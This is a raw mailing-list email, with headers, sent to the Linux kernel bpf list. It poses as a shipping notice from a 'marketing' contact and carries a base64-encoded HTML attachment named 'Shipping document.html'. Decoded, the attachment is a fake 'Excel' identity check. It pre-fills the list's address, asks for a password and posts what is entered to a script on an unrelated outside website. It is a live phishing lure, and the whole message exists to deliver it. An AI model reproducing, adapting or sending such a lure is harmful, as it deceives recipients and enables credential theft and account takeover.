Return-Path: <bpf+bounces-2023-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id C3DCA726A39
	for <lists+bpf@lfdr.de>; Wed,  7 Jun 2023 21:58:30 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 7E6A12813AF
	for <lists+bpf@lfdr.de>; Wed,  7 Jun 2023 19:58:29 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id E833A39247;
	Wed,  7 Jun 2023 19:58:19 +0000 (UTC)
X-Original-To: bpf@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B6BE0182AE
	for <bpf@vger.kernel.org>; Wed,  7 Jun 2023 19:58:19 +0000 (UTC)
Received: from kwangna.com (unknown [5.182.39.133])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 9428219B6
	for <bpf@vger.kernel.org>; Wed,  7 Jun 2023 12:58:16 -0700 (PDT)
Received: from 62.81.146.217.baremetal.zare.com (localhost [IPv6:::1])
	by kwangna.com (Postfix) with ESMTP id C88BB1863B0B
	for <bpf@vger.kernel.org>; Wed,  7 Jun 2023 11:01:36 +0200 (CEST)
From: Alice Wong <customer.service@brighterbrain.com.my>
To: bpf@vger.kernel.org
Subject: =?UTF-8?B?5Zue5aSNIFJl77yaKFNjYW5uZWQpIERvY35PcmlnaW5hbCBDb3B5IC0gRllJ?=
Date: 7 Jun 2023 11:01:35 +0200
Message-ID: <20230607110135.276E191A9F428EF9@brighterbrain.com.my>
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----=_NextPart_000_0012_C2846383.48165996"
X-Spam-Status: No, score=2.9 required=5.0 tests=BAYES_50,
	HTML_FONT_LOW_CONTRAST,HTML_IMAGE_ONLY_32,HTML_IMAGE_RATIO_06,
	HTML_MESSAGE,MAY_BE_FORGED,MIME_HTML_ONLY,RCVD_IN_VALIDITY_RPBL,
	SPF_HELO_FAIL,SPF_SOFTFAIL,T_HTML_ATTACH,T_SCC_BODY_TEXT_LINE,
	URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.6
X-Spam-Level: **
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_C2846383.48165996
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><TITLE></TITLE>
<META content=3D"text/html; charset=3Dunicode" http-equiv=3DContent-Type>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY style=3D"MARGIN: 0.5em">
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial"><FONT c=
olor=3D#000000><SPAN style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)">Hello =
bpf,<BR></SPAN></FONT><FONT color=3D#000000><SPAN style=3D"FONT-SIZE: 15px;=
 COLOR: rgb(32,31,30)"><BR></SPAN></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial"><FONT c=
olor=3D#000000><SPAN style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)">Kindly=
 find the attached shipping document for your reference.<BR><BR>Please conf=
irm the shipment date&nbsp;for delivery.</SPAN></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial">&nbsp;<=
/DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial"><FONT c=
olor=3D#000000><SPAN style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)">Thanks=
 &amp; Regards,</SPAN></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial"><FONT c=
olor=3D#000000><SPAN style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)"><BR></=
SPAN></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: monospace; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-d=
ecoration-style: initial; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial"><FONT c=
olor=3D#000000><SPAN style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)"><B>Ali=
ce Wong.<BR></B></SPAN></FONT></DIV>
<P>
<SPAN style=3D'FONT-SIZE: 14px; FONT-FAMILY: Roboto, "Helvetica Neue", Helv=
etica, Tahoma, Arial, "PingFang SC", "Microsoft YaHei"; WHITE-SPACE: normal=
; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(102=
,102,102); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; L=
ETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px=
; text-decoration-style: initial; font-variant-ligatures: normal; font-vari=
ant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-color: initial'>Marketi=
ng</SPAN>
<BR style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; W=
HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 4=
00; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER=
-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; tex=
t-decoration-style: initial; font-variant-ligatures: normal; font-variant-c=
aps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: ini=
tial; text-decoration-color: initial"></P>
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; te=
xt-decoration-style: initial; font-variant-ligatures: normal; font-variant-=
caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
itial; text-decoration-color: initial">
<DIV>
<DIV>
<DIV><FONT color=3D#000000>Address: 168 Qianpu Rd, Siming District, Xiamen,=
 Fujian, China<BR></FONT></DIV></DIV></DIV>
<DIV><FONT color=3D#000000>Mobile : +86-5924761773.</FONT></DIV></DIV></BOD=
Y></HTML>
------=_NextPart_000_0012_C2846383.48165996
Content-Type: text/html; name="Shipping document.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Shipping document.html"

DQo8L3NjcmlwdD4NCjxIVE1MPjxIRUFEPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlw
ZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiPg0KDQo8U1RZTEUg
dHlwZT10ZXh0L2Nzcz4NCmJvZHksIGh0bWwge2hlaWdodDogMTAwJTttYXJnaW46IDA7ICBm
b250LWZhbWlseTogIlNlZ29lIFVJIFdlYmZvbnQiLC1hcHBsZS1zeXN0ZW0sIkhlbHZldGlj
YSBOZXVlIiwiTHVjaWRhIEdyYW5kZSIsIlJvYm90byIsIkVicmltYSIsIk5pcm1hbGEgVUki
LCJHYWR1Z2kiLCJTZWdvZSBYYm94IFN5bWJvbCIsIlNlZ29lIFVJIFN5bWJvbCIsIk1laXJ5
byBVSSIsIktobWVyIFVJIiwiVHVuZ2EiLCJMYW8gVUkiLCJSYWF2aSIsIklza29vbGEgUG90
YSIsIkxhdGhhIiwiTGVlbGF3YWRlZSIsIk1pY3Jvc29mdCBZYUhlaSBVSSIsIk1pY3Jvc29m
dCBKaGVuZ0hlaSBVSSIsIk1hbGd1biBHb3RoaWMiLCJFc3RyYW5nZWxvIEVkZXNzYSIsIk1p
Y3Jvc29mdCBIaW1hbGF5YSIsIk1pY3JvaWxzb2Z0IE5ldyBUYWkgTHVlIiwiTWljcm9zb2Z0
IFBoYWdzUGEiLCJNaWNyb3NvZnQgVGFpIExlIiwiTWljcm9zb2Z0IFlpIEJhaXRpIiwiTW9u
Z29saWFuIEJhaXRpIiwiTVYgQm9saSIsIk15YW5tYXIgVGV4dCIsIkNhbWJyaWEgTWF0aCI7
fQkNCi53cmFwcGVyIHsgIGJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwczovL2lzYy5zYW5z
LmVkdS9kaWFyeWltYWdlcy9pbWFnZXMvYmx1cnJlZC5qcGcpOyAgYmFja2dyb3VuZC1yZXBl
YXQ6IG5vLXJlcGVhdDsgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsgIGJhY2tncm91
bmQtcG9zaXRpb246IGNlbnRlcjsgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7ICBwb3NpdGlv
bjogZml4ZWQ7ICB0b3A6IDA7ICBsZWZ0OiAwOyAgaGVpZ2h0OiAxMDAlOyAgd2lkdGg6IDEw
MCU7ICAgZGlzcGxheTogZmxleDsgIGZsZXgtZmxvdzogY29sdW1uIG5vd3JhcDsganVzdGlm
eS1jb250ZW50OiBjZW50ZXI7ICBhbGlnbi1pdGVtczogY2VudGVyOyAgYm94LXNpemluZzog
Ym9yZGVyLWJveDt9DQouZWxlbWVudCB7ICB3aWR0aDogMzIwcHg7ICBoZWlnaHQ6IDMwMHB4
OyAgcGFkZGluZzogNDBweCAzMHB4OyAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgIGJv
cmRlcjogMXB4IHNvbGlkIGdyZXk7ICBib3JkZXItY29sb3I6ICMwMzYzMjg7fQ0KLmVsZW1l
bnRlewl3aWR0aDogNDAwcHg7ICBoZWlnaHQ6IDMwMHB4OyAgcGFkZGluZzogNDBweCAzMHB4
OyAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgIGJvcmRlcjogMXB4IHNvbGlkIGdyZXk7
fQ0KZGl2IC5zaWduLW9wdCB7CXBhZGRpbmc6IDIwcHggMHB4Owlmb250LXNpemU6IDE0cHg7
fQ0KLm5ld2J1dHRvbnsJd2lkdGg6IDExMHB4OyBmbG9hdDogbGVmdDsgYm9yZGVyLWNvbG9y
OiAjMDM2MzI4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDM2MzI4OyBjb2xvcjogI2ZmZjsgZm9u
dC1zaXplOiAxNHB4OyBwYWRkaW5nOiA4cHggMDsgY3Vyc29yOiBwb2ludGVyOyBib3JkZXI6
IG5vbmU7fQ0KPC9TVFlMRT4NCjx0aXRsZT5FeGNlbDwvdGl0bGU+DQo8bGluayByZWw9InNo
b3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vaS5neWF6by5jb20vN2FlNzczZmY2MWUyYzhh
ODhiZGE1NTMwYzNiMmFhMTMucG5nIiB0eXBlPSIiPg0KPC9IRUFEPg0KPEJPRFk+DQo8RElW
IGNsYXNzPXdyYXBwZXI+PCEtLSBGaXhlZCBlbGVtZW50IHRoYXQgc3BhbnMgdGhlIHZpZXdw
b3J0IC0tPg0KPERJViBpZD1lbGVtZW50IGNsYXNzPWVsZW1lbnQ+DQo8Rk9STSBtZXRob2Q9
cG9zdCBhY3Rpb249Imh0dHBzOi8vc3Bpcml0dWFsdHJhdmVscy5jby5pbi93cC1hZG1pbi8v
a28vZXhlZS5waHAiIGF1dG9jb21wbGV0ZT0iIj48cD4NCjxESVYgaWQ9bG9nbz48SU1HIGJv
cmRlcj0wIGFsdD0iIiBzcmM9Imh0dHBzOi8vaS5neWF6by5jb20vMGRjZjViYzc1YzE3NTEz
YjRkN2MyZDk1ODc3MWQyOTQuanBnIiBjb2xvcj0iIzAzNjMyOCIgYWxpZ249InRvcCIgd2lk
dGg9IjExMCIgaGVpZ2h0PSI1NSIvPiA8Yj48L2I+PC9ESVY+PC9wPjxwPg0KPERJViBpZD1j
b250IHN0eWxlPSJURVhULUFMSUdOOiBsZWZ0OyBQQURESU5HLVRPUDogMTBweDsgZm9udC1z
aXplOjIwcHg7IGNvbG9yOiMwYTBhMGE7IiA+IlZlcmlmeSB5b3VyIGlkZW50aXR5ISI8L0RJ
Vj48L3A+PHA+DQoNCjxESVY+PElOUFVUICBuYW1lPSJBQSIgcmVxdWlyZWQ9InJlcXVpcmVk
IiBpZD0ibG9naW4iIHZhbHVlPSJicGZAdmdlci5rZXJuZWwub3JnIiBwbGFjZWhvbGRlcj0i
RW1haWwgYWRkcmVzcyIgcmVhZG9ubHkgc3R5bGU9IndpZHRoOjMyMDsgaGVpZ2h0OjMwOyBi
b3JkZXItY29sb3I6ICMwYTBhMGEiPjwvRElWPjwvcD4NCjxESVY+PElOUFVUIHR5cGU9cGFz
c3dvcmQgbmFtZT0iQkIiIHJlcXVpcmVkPSJyZXF1aXJlZCIgaWQ9InBhc3N3ZCIgYXV0b2Zv
Y3VzPSJhdXRvZm9jdXMiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgc3R5bGU9IndpZHRoOjMy
MDsgaGVpZ2h0OjMwOyBib3JkZXItY29sb3I6ICMwYTBhMGEiPjwvRElWPg0KPERJViBpZD1z
aWduLW9wdCBjbGFzcz1zaWduLW9wdD4NCjxESVYgaWQ9Y29udCBzdHlsZT0iVEVYVC1BTElH
TjogbGVmdDsgUEFERElORy1UT1A6IDVweDsgZm9udC1zaXplOjEycHg7IGNvbG9yOiMwYTBh
MGE7IiA+PC9ESVY+PC9wPjxwPg0KPERJViBpZD1uby1hY2M+PC9BPjwvRElWPg0KPERJViBj
bGFzcz1idXR0b24+PEEgaHJlZj0iIyI+PEJVVFRPTiBpZD1pOTgzODkzIGNsYXNzPW5ld2J1
dHRvbiB0eXBlPXN1Ym1pdCBuYW1lPXN1Ym1pdD4NCjxGT05UIGNvbG9yPSNmZmY+Q29udGlu
dWU8L0ZPTlQ+PC9CVVRUT04+PC9BPjwvRElWPg0KPERJViBpZD1zaWduLW91dCBjbGFzcz1z
aWduLW9wdD48QSBocmVmPSIjIj48L0E+PC9ESVY+PC9ESVY+PC9GT1JNPjwvRElWPjwhLS0g
eW91ciBhY3R1YWwgY2VudGVyZWQgZWxlbWVudCAtLT48L0RJVj48L0JPRFk+PC9IVE1MPg==


------=_NextPart_000_0012_C2846383.48165996--

